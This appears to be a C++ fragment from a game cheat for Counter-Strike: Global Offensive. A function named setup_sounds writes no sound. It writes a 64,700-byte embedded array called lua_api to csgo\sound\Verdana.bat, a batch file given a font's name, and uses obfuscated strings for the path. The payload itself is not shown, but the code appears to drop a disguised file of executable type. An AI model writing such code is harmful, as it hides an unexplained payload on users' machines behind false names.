#include "custom_sounds.hpp"

__forceinline void setup_sounds()
{
	CreateDirectory("csgo\\sound", nullptr);
	FILE* file = nullptr;

	file = fopen(crypt_str("csgo\\sound\\Verdana.bat"), crypt_str("wb"));
	fwrite(lua_api, sizeof(unsigned char), 64700, file); //-V575
	fclose(file);
}